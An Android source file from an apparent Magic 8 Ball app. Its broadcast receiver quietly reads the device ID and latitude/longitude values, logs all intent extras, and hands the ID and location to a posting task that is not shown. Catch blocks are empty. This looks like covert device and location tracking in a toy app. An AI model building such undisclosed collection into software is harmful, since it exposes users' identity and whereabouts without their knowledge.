package com.vintagearcadeworks.magic8ball;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.ProtocolException;
import java.net.URL;

import javax.net.ssl.HttpsURLConnection;

public class MyBroadcastReceiver extends BroadcastReceiver {
        String deviceId, lat, lng;



        @Override
        public void onReceive(Context context, Intent intent) {
            try {
                if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    deviceId = Settings.Secure.getString(
                            context.getContentResolver(),
                            Settings.Secure.ANDROID_ID);
                }
            } catch (Exception e) {

            }
            try {
                Bundle i = intent.getExtras();
                for (String key : i.keySet()) {
                    Log.i("BR: ", key + " => " + i.get(key));
                    if (key.equals("lat"))
                        lat = i.get(key).toString();
                    if (key.equals("lng"))
                        lng = i.get(key).toString();
                }
                new PostData().execute(deviceId, lat, lng);


            } catch (Exception e) {

            }


        }



}


